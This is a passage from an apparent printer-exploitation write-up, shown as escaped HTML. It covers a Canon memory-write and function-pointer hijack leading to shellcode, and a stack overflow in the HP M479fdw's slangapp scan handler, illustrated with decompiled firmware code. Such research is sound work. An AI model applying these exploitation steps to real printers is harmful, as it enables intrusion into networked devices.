    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt;, it will overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response_buf-&amp;gt;id&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbinfo-&amp;gt;id&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;That is, if we can overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; structure and forge the structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;, we can do arbitrary memory writing. We need to find a global buffer to forge the structure. We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;After we have arbitrary memory writing. We can overwrite the function pointer of SLP service with BJNP session buffer pointer.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_4159CF90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_45C8FF14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// SLP function&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It does not implement DEP. After overwriting the function pointer, we can use the BJNP session buffer again to put our shellcode. After that, we can use the SLP attribute request to control the PC and run our shellcode.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;Our target this time is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HP Color LaserJet Pro M479fdw&lt;/code&gt; printer, which is primarily Linux-based. This makes the analysis relatively simpler. Under the Web Service, there are numerous â€˜cgiâ€™ files providing various printer operations. These operate via the FastCGI method. You can refer to the nginx config to see which path corresponds to which port and service. The config can be found at rootfs/sirius/rom/httpmgr_nginx.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/local/slanapp&lt;/code&gt; is responsible for handling scan-related operations and primarily listens on 127.0.0.1:14030.&lt;/p&gt;

&lt;p&gt;We can see from rootfs/sirius/rom/httpmgr_nginx/rest_scan.conf :
&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we access /Scan/Jobs, the request is forwarded to a FastCGI listening on the 14030 port. After analysis, we found that it was handled by /rootfs/usr/local/bin/slangapp. When we send a request to /Scan/Jobs, it will call scan_job_http_handler in slangapp.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There is a stack overflow at rest_scan_handle_get_request in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slangapp&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_job_http_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+14h] [bp-2Ch]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-28h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+20h] [bp-20h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+30h] [bp-10h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+38h] [bp-8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+40h] [bp+0h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+44h] [bp+4h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+C8h] [bp+88h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x81u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_5DBD0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acceptRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1193517589&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_7:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getVerb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getContentLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span 